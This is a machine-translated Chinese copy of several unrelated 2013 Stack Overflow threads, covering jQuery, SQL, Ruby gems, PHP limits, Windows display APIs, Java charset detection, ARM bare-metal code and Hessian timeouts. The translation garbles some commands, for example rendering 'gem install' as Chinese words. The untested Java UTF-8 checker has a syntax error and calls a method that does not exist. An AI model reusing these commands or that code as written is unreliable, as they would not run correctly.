或者，如果您需要取消绑定特定选择器，您可以取消对它的委托：

```
var selector = 'a.my-fancy-box';
selector = selector + ":not('.fancybox-item, .fancybox-nav')";
$(document).undelegate(selector, 'click.fb-start'); 
```

或者：

```
// Bind
$('a.my-fancy-box').fancybox({live: false});

// Unbind
$('a.my-fancy-box').unbind('click.fb'); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-09-23T04:42:45.630

正如前面提到的：`$(document).unbind('click.fb-start');` 但您也可能希望将此选项添加到 fancybox init 调用中：`live:false`

# sql - 通过检查多列从 SQL 表中获取记录

> ID：15154527
> 
> 赞同：0
> 
> 时间：2013-03-01T09:34:40.660
> 
> 标签：sql, sql-server-2008

我的表结构如下

```
ID    DefID    AttrID    ValInt     ValReal    ValDate    ValStr
1      1         1        NULL       NULL        NULL      hi
2      1         1        NULL       NULL        NULL      hi
3      1         1        NULL       NULL        NULL      hi
4      1         1        NULL       NULL        NULL      hi
1      1         1           0       NULL        NULL      NULL
2      1         1           1       NULL        NULL      NULL
3      1         1           0       NULL        NULL      NULL
4      1         1           0       NULL        NULL      NULL 
```

这是我的名为 Table 的表，现在我想通过仅具有 ValStr='h1' 和 ValInt=1 的查询来获取 ID，这意味着只有那些 ValStr 为 hi 且 ValInt = 1 的 ID 属于同一 ID 列。请帮忙。

这是我到目前为止所做的。

```
select ID from Table where DefID=1 and ValStr='hi' and  ValInt=1 
```

我的实际答案应该是

```
ID
 2 
```

但我从上面的查询中得到了这个

```
ID
1
2
3
4 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:47:38.413

```
SELECT  ID
FROM    TableName
WHERE   (DefID = 1 AND ValInt = 1) OR
        (DefID = 1 AND ValStr = 'hi')
GROUP   BY ID
HAVING  COUNT(*) = 2 
```

*   [SQLFiddle 演示](http://www.sqlfiddle.com/#!3/6e582/1)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T09:51:26.643

另一种选择

```
select t1.ID from Table t1
where EXISTS (
              SELECT *
              FROM Table t2
              WHERE t2.DefID = 1 AND t2.ValStr = 'hi'
              ) and  t1.ValInt = 1 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T09:39:04.267

怎么样

```
SELECT distinct t1.ID 
FROM Table t1 
JOIN Table t2 on t1.id = t2.id
WHERE t1.DefID=1 and t2.DefID = 1
AND t1.ValStr='hi' and  t2.ValInt=1 
```

或（取决于口味）

```
SELECT distinct t1.ID 
FROM Table t1 
JOIN Table t2 on t1.id = t2.id AND  t1.DefID=1 = t2.DefID
WHERE t1.DefID=1 AND t1.ValStr='hi' and  t2.ValInt=1 
```

# grails - 如何更新 vmc 以使其使用 cfoundry 0.5.0 而不是 0.4.21？

> ID：15154529
> 
> 赞同：1
> 
> 时间：2013-03-01T09:34:49.243
> 
> 标签：grails, cloud-foundry, vmc

我正在尝试连接到 cloudfoundry 上的 mysql 服务。我安装了 vmc v 0.4.7（目前是最新的）。我已经部署了我的 grails 应用程序并通过它创建了一个 mysql 服务。现在我想访问mysql服务。我尝试执行此处列出的步骤：http:
[//docs.cloudfoundry.com/tools/vmc/caldecott.html](http://docs.cloudfoundry.com/tools/vmc/caldecott.html)
我也安装了 caldecott。但是当我这样做时，`vmc tunnel`我收到回复说我需要安装`tunnel-vmc-plugin`. 我这样做了，并且`tunnel-vmc-plugin`（v 0.2.0）安装了。
现在，当我这样做时，我收到一条错误消息，指出( 所要求的) 和( 所要求的)`vmc tunnel`之间存在冲突。如果我尝试卸载任何一个，其他需要那个特定的 gem`cfoundry 0.4.21``vmc 0.4.7``cfoundry 0.5.0``tunnel-vmc-plugin 0.2.0``cfoundry``cfoundry`版本失控。如果您访问[https://github.com/cloudfoundry/vmc-plugins/blob/master/tunnel/tunnel-vmc-plugin.gemspec](https://github.com/cloudfoundry/vmc-plugins/blob/master/tunnel/tunnel-vmc-plugin.gemspec)
的 git 存储库， 您会看到有一个小链接要求您访问[cfoundry至 0.5.0](https://github.com/cloudfoundry/vmc-plugins/commit/b73ae4ecbfae3a7c599373384f8a2deb6d00358a)`tunnel-vmc-plugin`

我怎样才能做到这一点？在网上阅读了很多关于 gem 文件等的内容，但我从未学习过 ruby​​，而且关于 vmc 插件的信息也很少。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T18:33:24.277

目前解决这个问题的最简单方法是通过使用 --pre 开关和 gem 来安装预发布版本；

宝石安装 vmc --pre

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-04T08:36:02.457

终于做到了。

是的，诀窍是这样做，`gem install vmc --pre`但是这个 vmc 需要的每个依赖项也需要与`--pre`.
令人惊讶的是，我搜索再搜索再搜索，但在整个 WEB 上都没有特别提到这一点。对于其他被卡住的人，首先卸载所有以下 gem：
- cfoundry
- tunnel-vmc-plugin
- manifests-vmc-plugin
- Mothership
- caldecott-client
- caldecott
- vmc

完成此操作后，然后重新安装每个上述插件的`--pre`命令。例如
`gem install cfoundry --pre`
，请更新文档 Burt Beckwith 和其他致力于构建云代工的人！像我这样对红宝石一无所知的新手很难进行设置！

# php - PHP警告POST内容长度超过限制

> ID：15154530
> 
> 赞同：1
> 
> 时间：2013-03-01T09:34:52.833
> 
> 标签：php, file-upload, warnings

我收到一个 PHP 警告，上面写着：

> PHP 警告：2290848 字节的 POST 内容长度超过第 0 行未知中 2097152 字节的限制，

以下是我的配置：

在 /etc/php.ini

```
post_max_size = 2.5M
upload_max_filesize = 500K
max_file_uploads = 5 
```

在 /etc/httpd/conf/httpd.conf

```
LimitRequestBody 3000000 
```

从上面，我的帖子最大大小应该是 2.5M。为什么在 2M（2097152 字节）的下限时会触发此警告？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T09:43:47.537

[post_max_size](http://www.php.net/manual/en/ini.core.php#ini.post-max-size)是一个整数，2.5 不是。

# c++ - 将第二台显示器显示设置更改为重复

> ID：15154542
> 
> 赞同：2
> 
> 时间：2013-03-01T09:35:30.903
> 
> 标签：c++, winapi, multiple-monitors

我正在尝试以编程方式使第二个监视器具有重复显示。我下面的功能应该将第二台显示器的显示更改为“重复显示”，即让第二台显示器显示第一台/主显示器上的所有内容。

**我的问题：**当我运行我的函数时，它成功地找到了第二个监视器，并通过更改 DEVMODE dmPosition.x 属性将监视器显示 x 坐标更改为 0，即主监视器屏幕的左侧。我的两台显示器都会自行刷新（它们变黑然后重新显示屏幕），但第二台显示器仍然具有*扩展显示*而不是重复显示。

**有什么想法可以让我的第二台显示器重复显示吗？**

一些相关信息：
- 我的第二台显示器是液晶电视，并通过 HDMI 连接到我的笔记本电脑- 我的功能代码与此[MSDN 页面](http://support.microsoft.com/kb/308216/en-gb)
上的示例完全相同，该页面描述了如何连接第二台显示器而无需重新启动。不过，我已经更改了 LINE 30。 - 我知道我可以使用一个 WinAPI 函数调用更改 Windows 7 上的显示，但我需要我的程序在 Windows 2000 及更高版本上工作。

```
// From http://support.microsoft.com/kb/308216/en-gb Title: You must restart...
BOOL TVManager::AddUnattachedDisplayDeviceToDesktop()
{
    DWORD DispNum = 0;
    DISPLAY_DEVICE DisplayDevice;
    DEVMODE defaultMode;
    HDC hdc;
    int nWidth;
    BOOL bFoundSecondary = FALSE;

    hdc    = GetDC(0);
    nWidth = GetDeviceCaps(hdc, HORZRES);
    ReleaseDC(0, hdc);

    // Initialize DisplayDevice.
    ZeroMemory(&DisplayDevice, sizeof(DisplayDevice));
    DisplayDevice.cb = sizeof(DisplayDevice);

    // Get display devices.
    while ((EnumDisplayDevices(NULL, DispNum, &DisplayDevice, 0)) && (bFoundSecondary == FALSE))
    { 
        ZeroMemory(&defaultMode, sizeof(DEVMODE));
        defaultMode.dmSize = sizeof(DEVMODE);
        if (!EnumDisplaySettings((LPTSTR)DisplayDevice.DeviceName, ENUM_REGISTRY_SETTINGS, &defaultMode)) {
            printf("1\n");
            return FALSE; // Store default failed
        }

        if (!(DisplayDevice.StateFlags & DISPLAY_DEVICE_PRIMARY_DEVICE)) {
            //Found the first secondary device.
            _tprintf(_T("Found the first secondary device: Name: %s, Pos: %d, Width: %d\n"), DisplayDevice.DeviceName, defaultMode.dmPosition.x, nWidth);
            bFoundSecondary           = TRUE;
            defaultMode.dmPosition.x = 0; // LINE CHANGED: ONLY CHANGE FROM MSDN'S CODE
            defaultMode.dmFields      = DM_POSITION; 
            ChangeDisplaySettingsEx((LPTSTR)DisplayDevice.DeviceName, &defaultMode, NULL, CDS_NORESET|CDS_UPDATEREGISTRY, NULL); 
            _tprintf(_T("Check for error: %u\n"), GetLastError()); // prints "Check for error: 0" which means no error occurred

            // A second call to ChangeDisplaySettings updates the monitor.
            ChangeDisplaySettings(NULL, 0); 
            _tprintf(_T("Check for error: %u\n"), GetLastError()); // prints "Check for error: 0" which means no error occurred
        } 

        // Reinitialize DisplayDevice. 
        ZeroMemory(&DisplayDevice, sizeof(DisplayDevice));
        DisplayDevice.cb = sizeof(DisplayDevice);
        DispNum++;
    } // End while the display devices. 

    return TRUE;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T16:11:53.937

Windows XP 及更早版本使用与 Vista 及更高版本 (WDDM) 不同的显示驱动程序模型 (XPDM)。XPDM 上的镜像很大程度上取决于您的显卡供应商。一般的想法是，为了扩展桌面，你提供一个扩展驱动程序；要镜像桌面的一部分，您需要提供镜像驱动程序。

在大多数情况下，每个扩展驱动程序负责图形卡上的一个输出。假设您有一个双 DVI 卡，那么您应该在设备管理器中看到两个扩展驱动程序，每个驱动程序负责一个 DVI 端口。当您想将显示器设置为扩展桌面时，请启用扩展驱动程序并为其提供合理的位置。

镜像比较棘手。这是不同卡供应商之间的行为可能会有所不同的地方。从操作系统的角度来看，这就是正在发生的事情。与显卡端口关联的扩展驱动程序被禁用。如果尚未启用镜像驱动程序，则启用它。然后将镜像驱动器放置在 (0, 0) 处。然后在您的显卡/驱动程序内部发生了一些诡计，显示器显示镜像驱动程序的屏幕缓冲区内的内容。

In order to set a monitor into mirror mode on XPDM, you need find the extend driver it's currently showing stuff from and disable it. This may be all you have to do. Some of the vendors will automatically do the rest for you and start mirroring the primary display. Some vendors will do whatever your monitor was doing last before it was put into extend mode. If you find your monitor not showing anything, you can try to enable the mirror driver. If you manage to find the mirror driver and enable it, what happens after is anyone's guess. There isn't a universal way to wire up a monitor to a mirror driver.

# soap - 黑莓 ksoap2 请求问题

> ID：15154544
> 
> 赞同：0
> 
> 时间：2013-03-01T09:35:35.707
> 
> 标签：soap, blackberry, ksoap2

第一次发问题。我正在尝试使用 ksoap2 库从黑莓应用程序内部调用一些 SOAP 网络服务。我已经成功地从一个使用 HTTP url 的服务获得响应，但是现在我正试图从（不同的）HTTPS url 获得响应，我遇到了一堵砖墙。我得到的响应转储有以下错误消息：

“路由元素值的消息时发生错误：（我在请求中指定的国家选项）。可能无法使用此属性设置保持活动和关闭。参数名称：值。”

奇怪的是，使用带有 XML 请求转储的 Oxygen XML 的 SOAP 工具工作得很好。任何想法从哪里开始寻找？这已经占用了一整天的时间。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-04T13:45:17.530

## 更新：

回应您在下面的评论 - 结果表明[双引号是 SOAP 规范的一部分](http://www.w3.org/TR/2000/NOTE-SOAP-20000508/#_Toc478383528)。一些服务器在实施时更加轻松，并且可以在没有引号的情况下工作。

ksoap2 不会将引号强加到您的操作中 - 您可能需要修补您的 ksoap2 库以确保引号始终存在。

ymmv

* * *

## 原来的：

我不认为这是与 SOAP 相关的问题，也不是与 BlackBerry 相关的问题。

我认为问题出在服务器端，因为该错误字符串不是常见错误（只需谷歌它就可以看到除此问题之外的整个互联网上没有任何点击）。

看起来这是服务器端网络人员的工作，告诉你他看到了什么。

我能想到的唯一另一件事是使用 HTTP 而不是 HTTPS 进行调用。然后，您可以使用一些网络嗅探器来查看消息之间的区别。或者，安装一个带有“Charles”之类的 SSL 代理，然后像这样嗅探数据包。

# java - 本机库，错误：此 Java 实例不支持 32 位 JVM

> ID：15154557
> 
> 赞同：3
> 
> 时间：2013-03-01T09:36:37.513
> 
> 标签：java, netbeans, jvm, java-native-library

你好 stackoverflow 社区，

我正在使用 NetBeans IDE 7.2.1，并且正在尝试使用本机库编译+运行项目。我的库需要 32 位 JVM。我正在运行 Windows 7 64 位。在尝试编译+运行我的项目时，我遇到了以下情况：

```
 Error: This Java instance does not support a 32-bit JVM.
    Please install the desired version.
    Java Result: 1
    BUILD SUCCESSFUL (total time: 0 seconds) 
```

我已尝试进行配置并包含以下参数（无济于事）：

```
 -d32
    -d32 -vm "C:\Program Files (x86)\Java\jre7\bin\javaw.exe" 
    -vm "C:\Program Files (x86)\Java\jre7\bin\javaw.exe" 
```

我安装了 64 位 JRE 和 32 位 JRE，并且在我的平台管理器中同时提供了 64 位 JDK 和 32 位 JDK。

有什么建议可以解决这个问题吗？我读过你可以通过在 32 位 JRE 之前安装 64 位 JRE 来解决问题；这是其中一个问题吗？（我确实先安装了64位）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:43:13.170

当您启动一个进程时（例如在命令提示符下，但当您从代码启动另一个进程时它与 AFAIK 相同）时，会搜索一组路径（包含在 PATH (?) 环境变量中）以查找具有名称的可执行文件匹配您输入的内容。如果 64 位和 32 位版本具有相同的名称，并且首先找到 64 位版本，则会执行该版本。我建议指定 32 位 JDK 的完整路径。

**编辑：**
我刚刚看到这个问题是关于 NetBeans IDE 的。我从来没有使用过，所以我能给你的唯一建议是查看 NetBeans 的设置，并调整 JDK 和 JRE 的路径，使其指向 32 位版本。对于不使用 NetBeans 的人，我将在这里留下我的答案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-11-16T01:10:57.373

感谢@11684 的出色回答。我只想为那些从命令行/命令提示符编译的人添加一个代码示例。

对于编译，使用哪个无关紧要`javac`- 32 位或 64 位。

```
>javac MyJavaProgramUsing32BitNativeLib.java 
```

对于程序的实际执行，指定 32 位版本的路径*很重要*`java.exe`

我将发布一个代码示例`Windows`，因为这似乎是 OP 使用的操作系统。

**视窗**

最有可能的是，代码将类似于：

```
>"C:\Program Files (x86)\Java\jre#.#.#_###\bin\java.exe" MyJavaProgramUsing32BitNativeLib 
```

区别在于后面的数字`jre`。要查找应使用的数字，请输入：

```
>dir "C:\Program Files (x86)\Java\" 
```

在我的机器上，流程如下

```
C:\Users\me\MyProject>dir "C:\Program Files (x86)\Java"
 Volume in drive C is Windows
 Volume Serial Number is 0000-9999

 Directory of C:\Program Files (x86)\Java

11/03/2016  09:07 PM    <DIR>          .
11/03/2016  09:07 PM    <DIR>          ..
11/03/2016  09:07 PM    <DIR>          jre1.8.0_111
               0 File(s)              0 bytes
               3 Dir(s)  107,641,901,056 bytes free

C:\Users\me\MyProject> 
```

所以我知道我的号码是`1.8.0_111`，我的命令是

```
C:\Users\me\MyProject>"C:\Program Files (x86)\Java\jre1.8.0_111\bin\java.exe" MyJavaProgramUsing32BitNativeLib 
```

# magento - Magento 管理订单视图页面折叠到左栏？

> ID：15154562
> 
> 赞同：1
> 
> 时间：2013-03-01T09:36:47.410
> 
> 标签：magento, magento-1.7

我的 magento 管理员订单视图（订单详细信息）页面已折叠到页面的左侧。

如果有人知道这个问题，请帮忙，

谢谢，

# html - html 数据图标未在 IE 中呈现（MVC3 应用程序）

> ID：15154567
> 
> 赞同：0
> 
> 时间：2013-03-01T09:37:05.937
> 
> 标签：html, asp.net-mvc-3, icons

我有一个 asp .net MVC3 应用程序，它大部分都在正常工作。

我在某些地方使用数据图标而不是图像。这些在除 IE (v9) 之外的所有浏览器中都可以正常渲染。我想知道为什么会这样，我能做些什么来解决它？

例如，我有一个跨度呈现如下所示的 html...

```
<span class="navIcon" aria-hidden="true" data-icon=""/> 
```

在大多数浏览器中，它呈现如下......

![工作图标](../Images/22408cb1248471bfc470fe46c3fcd362.png)

但在 IE 中它呈现这样的......

![破碎的图标](../Images/dab67a25a03f8694af7888037edb9f73.png)

有谁知道为什么会发生这种情况？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T10:03:16.513

最可能的原因是 IE9 选择不使用您在 .eot 中定义的任何格式`@font-face`（例如 IE9 会跳过**.eot**并继续寻找**.woff**版本）。我建议您使用[Webfont Generator](http://www.fontsquirrel.com/tools/webfont-generator)之类的东西来获得所有不同的字体变体。结果，您`@font-face`应该与此类似：

```
@font-face {
    font-family: 'Pictos';
    src: url('pictos-web.eot');
    src: local('☺'), 
    url('pictos-web.woff') format('woff'), 
    url('pictos-web.ttf') format('truetype'),
    url('pictos-web.svg#webfontIyfZbseF') format('svg');
} 
```

# c - arm（裸机）：调用二进制文件作为函数

> ID：15154568
> 
> 赞同：-2
> 
> 时间：2013-03-01T09:37:09.090
> 
> 标签：c, arm, bare-metal

我有用于 AT91sam9 ARM 控制器的 AT91Bootloader。我需要添加一些额外的硬件初始化，但我只编译了 .bin 文件。我将 bin 文件加载到内存并尝试调用它：

```
((void (*)())0x00005000)(); 
```

但是，没有任何结果。请尽量少用汇编。我之前被介绍过汇编程序，但由于它的同谋，我无法理解 ARM 汇编程序。如何从引导加载程序中间调用，执行 bin 文件（它将在某个内存扇区，例如 0x00005000）然后返回引导加载程序并继续执行它自己的代码？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-03T22:46:01.780

如果 ARM asm “太复杂”，您会发现很难调试您遇到的任何问题。Basic* ARM 汇编是我遇到的*最简单的汇编语言之一。*

只要“.bin”格式正确，您的代码*应该可以*工作（尽管我不会在那里使用硬编码地址）。常见问题：

*   入口点应该是ARM代码；一些编译器默认使用 Thumb。使 Thumb 代码工作是可能的（如果有点棘手）。
*   入口点必须位于文件的开头。如果不拆卸，很难判断您是否正确完成了此操作。
*   链接器将在必要时插入“thunk”（又名“存根”）。一些链接器中的一个怪癖意味着 thunk 可以放在入口点*之前。*您可以使用（[此处](http://sourceware.org/binutils/docs/ld/ARM.html)`--stub-group-size=-1`的文档）解决此问题。

* 忽略不需要开始的 Thumb/VFP/NEON 等内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T14:43:21.203

ARM 程序集是最简单的程序之一，非常简单。如果你想继续做裸机，你至少需要学习一些组装。例如理解 Alexey 的评论。

您要查找的指令是 BX，它分支到一个地址，您需要分支到引导加载程序下载的代码的程序集是：

```
.globl tramp
tramp:
   bx r0 
```

C原型是

```
void tramp ( unsigned int address ); 
```

正如评论中提到的，程序需要针对您运行它的地址进行编译和/或它需要与位置无关，否则它将无法工作。此外，您还需要使用正确的入口点构建应用程序，如果它是原始二进制文件并且您分支到加载二进制文件的地址，则二进制文件需要能够以这种方式启动，方法是将二进制文件中的第一个字设为执行的入口点。

还要明白一个elf格式的文件包含了你要加载的数据，但整体上不是你要加载的数据。它是一个“二进制文件”，是的，但是要运行其中包含的程序，您需要解析和提取可加载部分并将它们加载到正确的位置。

如果您不知道这些术语的含义，请使用 google 和/或搜索 SO，答案就在那里。

# java - 重构自动检测文件的编码

> ID：15154577
> 
> 赞同：7
> 
> 时间：2013-03-01T09:38:22.623
> 
> 标签：java, encoding, refactoring

我需要检查编码文件。此代码有效，但有点长。如何能够对这个逻辑进行任何重构。也许可以为此目标使用其他变体？

**代码：**

```
class CharsetDetector implements Checker {

    Charset detectCharset(File currentFile, String[] charsets) {
        Charset charset = null;

        for (String charsetName : charsets) {
            charset = detectCharset(currentFile, Charset.forName(charsetName));
            if (charset != null) {
                break;
            }
        }

        return charset;
    }

    private Charset detectCharset(File currentFile, Charset charset) {
        try {
            BufferedInputStream input = new BufferedInputStream(
                    new FileInputStream(currentFile));

            CharsetDecoder decoder = charset.newDecoder();
            decoder.reset();

            byte[] buffer = new byte[512];
            boolean identified = false;
            while ((input.read(buffer) != -1) && (!identified)) {
                identified = identify(buffer, decoder);
            }

            input.close();

            if (identified) {
                return charset;
            } else {
                return null;
            }

        } catch (Exception e) {
            return null;
        }
    }

    private boolean identify(byte[] bytes, CharsetDecoder decoder) {
        try {
            decoder.decode(ByteBuffer.wrap(bytes));
        } catch (CharacterCodingException e) {
            return false;
        }
        return true;
    }

    @Override
    public boolean check(File fileChack) {
        if (charsetDetector(fileChack)) {
            return true;
        }
        return false;
    }

    private boolean charsetDetector(File currentFile) {
        String[] charsetsToBeTested = { "UTF-8", "windows-1253", "ISO-8859-7" };

        CharsetDetector charsetDetector = new CharsetDetector();
        Charset charset = charsetDetector.detectCharset(currentFile,
                charsetsToBeTested);

        if (charset != null) {
            try {
                InputStreamReader reader = new InputStreamReader(
                        new FileInputStream(currentFile), charset);

                @SuppressWarnings("unused")
                int valueReaders = 0;
                while ((valueReaders = reader.read()) != -1) {
                    return true;
                }

                reader.close();
            } catch (FileNotFoundException exc) {
                System.out.println("File not found!");
                exc.printStackTrace();
            } catch (IOException exc) {
                exc.printStackTrace();
            }
        } else {
            System.out.println("Unrecognized charset.");
            return false;
        }

        return true;
    }
} 
```

**问题：**

*   这个程序逻辑是如何重构的？
*   还有哪些检测编码的方法（如**UTF-16**序列等）？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T09:45:35.687

重构此代码的最佳方法是引入为您进行字符检测的 3rd 方库，因为他们可能会做得更好，并且会使您的代码更小。看到[这个问题](https://stackoverflow.com/questions/3759356/what-is-the-most-accurate-encoding-detector)有几个选择

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-03T17:16:16.763

正如已经指出的那样，您无法“知道”或“检测”文件的编码。完全准确需要您被*告知*，因为几乎总是有一个字节序列对于几个字符编码是模棱两可的。

[您会在这个SO question](https://stackoverflow.com/q/11479143/120163)中找到更多关于检测 UTF-8 与 ISO8859-1 的讨论。. 基本答案是**检查文件中的每个字节序列，**以验证其与预期编码的兼容性。有关 UTF-8 字节编码规则，请参阅[http://en.wikipedia.org/wiki/UTF-8](http://en.wikipedia.org/wiki/UTF-8)。

特别是，有一篇关于检测字符编码/集的非常有趣的论文 [http://www-archive.mozilla.org/projects/intl/UniversalCharsetDetection.html](http://www-archive.mozilla.org/projects/intl/UniversalCharsetDetection.html) 他们声称它们具有极高的准确性（猜测！）。价格是一个非常复杂的检测系统，包含有关不同语言中字符频率的知识，不适合 OP 暗示的 30 行代码大小。显然检测算法是内置在 Mozilla 中的，所以你可以找到并提取它。

我们选择了一个更简单的方案：a）相信你被告知的字符集是，如果你被告知 b）如果不是，检查 BOM 并相信它所说的如果存在，否则嗅探纯 7 位 ascii，然后是 utf8 ，或按此顺序排列的 iso8859。您可以构建一个丑陋的例程，一次通过文件执行此操作。

（我认为随着时间的推移，问题会变得更糟。Unicode 每年都会有一个新版本，在有效代码点上存在真正细微的差异。要做到这一点，你需要检查每个代码点的有效性。如果我们幸运的话，它们都是向后兼容的。）

[编辑：OP 似乎在用 Java 编码时遇到了麻烦。我们的解决方案和另一页上的草图不是用 Java 编码的，所以我不能直接复制和粘贴答案。我将根据他的代码在这里起草一个Java版本；它没有被编译或测试。YMMV]

```
int UTF8size(byte[] buffer, int buf_index)
// Java-version of character-sniffing test on other page
// This only checks for UTF8 compatible bit-pattern layout
// A tighter test (what we actually did) would check for valid UTF-8 code points
{   int first_character=buffer[buf_index];

    // This first character test might be faster as a switch statement
    if ((first_character & 0x80) == 0) return 1; // ASCII subset character, fast path
    else ((first_character & 0xF8) == 0xF0) { // start of 4-byte sequence
        if (buf_index+3>=buffer.length) return 0;
        if (((buffer[buf_index + 1] & 0xC0) == 0x80)
         && ((buffer[buf_index + 2] & 0xC0) == 0x80)
         && ((buffer[buf_index + 3] & 0xC0) == 0x80))
            return 4;
    }
    else if ((first_character & 0xF0) == 0xE0) { // start of 3-byte sequence
        if (buf_index+2>=buffer.length) return 0;
        if (((buffer[buf_index + 1] & 0xC0) == 0x80)
         && ((buffer[buf_index + 2] & 0xC0) == 0x80))
            return 3;
    }
    else if ((first_character & 0xE0) == 0xC0) { // start of 2-byte sequence
        if (buf_index+1>=buffer.length) return 0;
        if ((buffer[buf_index + 1] & 0xC0) == 0x80)
            return 2;
    }
    return 0;
}

public static boolean isUTF8 ( File file ) {
    int file_size;
    if (null == file) {
        throw new IllegalArgumentException ("input file can't be null");
    }
    if (file.isDirectory ()) {
        throw new IllegalArgumentException ("input file refers to a directory");
    }

    file_size=file.size();
    // read input file
    byte [] buffer = new byte[file_size];
    try {
        FileInputStream fis = new FileInputStream ( input ) ;
        fis.read ( buffer ) ;
        fis.close ();
    }
    catch ( IOException e ) {
        throw new IllegalArgumentException ("Can't read input file, error = " + e.getLocalizedMessage () );
    }

    { int buf_index=0;
      int step;

      while (buf_index<file_size) {
         step=UTF8size(buffer,buf_index);
         if (step==0) return false; // definitely not UTF-8 file
         buf_index+=step;

      }

    }

   return true ; // appears to be UTF-8 file
} 
```

# tomcat - spring hessian 客户端套接字连接重置

> ID：15154581
> 
> 赞同：1
> 
> 时间：2013-03-01T09:38:27.887
> 
> 标签：tomcat, spring-security, rmi, hessian, spring-remoting

我正在使用 spring 3.1.0、com.springsource.com.caucho-3.2.1.jar 和 tomcat-6.0.33 双方（客户端/服务器）。除了长时间使用服务（超过 9/10 分钟）外，所有远程服务调用都运行良好，没有任何问题。

我正在使用 Spring-Security 来保护远程调用。

我创建了一个新的远程服务，大约需要 30 分钟才能在真实场景中对客户端做出响应。如果执行时间少于 9.xx/10 分钟，则该服务运行良好，但在达到 9.xx/10 分钟后，我的 Hessian 客户端上的**连接重置**。

**客户端配置**

```
<bean id="someService" class="org.springframework.remoting.caucho.HessianProxyFactoryBean">
    <property name="serviceUrl" value="http://hostname:8080/remoting/someService"/>
    <property name="serviceInterface" value="com.SomeService"/>
    <property name="username" value="${service.username}"/>
    <property name="password" value="${service.password}"/>
</bean> 
```

**服务器配置**

```
<bean id="someService" class="com.SomeService" />

<bean name="/someService" class="org.springframework.remoting.caucho.HessianServiceExporter">
    <property name="service" ref="someService" />
    <property name="serviceInterface" value="com.SomeService" />
</bean> 
```

**客户端 - 堆栈跟踪：**

```
2013-Feb-28 17:48:19 DEBUG [http-8080-1] com.SomeService:85 - Calling Some Service
2013-Feb-28 17:58:16 ERROR [http-8080-1] com.SomeService:113 - 
org.springframework.remoting.RemoteConnectFailureException: 
Cannot connect to Hessian remote service at [http://hostname:8080/remoting/someService]; 
nested exception is com.caucho.hessian.client.HessianConnectionException: 
500: java.net.SocketException: Connection reset
at org.springframework.remoting.caucho.HessianClientInterceptor.convertHessianAccessException(HessianClientInterceptor.java:262) 
```

**服务器端 - Tomcat (localhost.log)**

```
SEVERE: Servlet.service() for servlet [remoting] in context with path [/JTService] 
threw exception [Hessian skeleton invocation failed; nested exception is
ClientAbortException:  java.net.SocketException: Connection reset] with root cause
java.net.SocketException: Connection reset
    at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:96) 
```

我尝试在 HessianProxyFactoryBean 下设置 30 分钟的 readTimeout 值，但在 9.xx/10 分钟后得到相同的异常。但是，当我尝试使用 readTimeout 2 分钟时，我在 2 分钟后**读取超时**。

将 readTimeout 设置为 2 分钟后，我得到：

```
2013-Feb-28 17:44:10 ERROR [http-8080-1] com.SomeService:113 - org.springframework.remoting.RemoteConnectFailureException: 
Cannot connect to Hessian remote service at [http://hostname:8080/remoting/someService]; 
nested exception is com.caucho.hessian.client.HessianConnectionException: 500: java.net.SocketTimeoutException: Read timed out
org.springframework.remoting.RemoteConnectFailureException: 
Cannot connect to Hessian remote service at [http://hostname:8080/remoting/someService]; 
nested exception is com.caucho.hessian.client.HessianConnectionException: 500: java.net.SocketTimeoutException: Read timed out 
```

就像 readTimeout 一样，我没有看到*HessianProxyFactoryBean*下与连接超时相关的设置。

请建议怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T06:08:39.530

经过一些调试，我发现我的Linux / CentOS 服务器在几分钟后**关闭了网络连接。**在 */proc/sys/net/ipv4/tcp_keepalive_time* 下增加连接保活时间后，连接超时问题得到解决。

Linux 控制台示例输出：

以秒为单位显示保活时间

```
[root@hostname ~]# cat /proc/sys/net/ipv4/tcp_keepalive_time 
7200 
```

使用以下命令增加值

```
[root@hostname ~]# echo "21600" > /proc/sys/net/ipv4/tcp_keepalive_time 
```

希望这对其他人也有帮助

# javascript - 单击另一个 div 时打开 div

> ID：15154583
> 
> 赞同：1
> 
> 时间：2013-03-01T09:38:35.893
> 
> 标签：javascript, jquery, ajax, load

我有一个html结构。具有以下内容：

```
<div class="edit"><a class="formtri" href="#">CHANGE</a> 
```

和：

```
 <div id="user_adr" style="display:none"> 
```

我想，当我单击更改时，将`user_adr`div 放在前面。Ajax 或其他解决方案。我尝试了 jQuery`.load`函数，但它不起作用。我怎样才能做到这一点？

[演示](http://jsfiddle.net/A3uMP/)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T09:41:23.393

您可以使用[toggle()](http://api.jquery.com/toggle/)函数来显示/隐藏 html 元素。

**[现场演示](http://jsfiddle.net/DXMg2/)**

```
$('.edit').click(function(){
   $('#user_adr').toggle();
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T09:40:29.117

您可以使用`jquery ui. dialog()`方法来显示一个对话框。像这样。 [jQuery 对话框](http://jqueryui.com/dialog/#animated)

```
<script>
  $(function() {
    $( "#dialog" ).dialog({
      autoOpen: false,
      show: {
        effect: "blind",
        duration: 1000
      },
      hide: {
        effect: "explode",
        duration: 1000
      }
    });

    $( "#opener" ).click(function() {
      $( "#dialog" ).dialog( "open" );
    });
  });
  </script>
</head>
<body>

<div id="dialog" title="Basic dialog">
  <p>This is an animated dialog which is useful for displaying information. The dialog window can be moved, resized and closed with the 'x' icon.</p>
</div>

<button id="opener">Open Dialog</button> 
```

* * *

## 回答 #3

> 赞同：1
> 
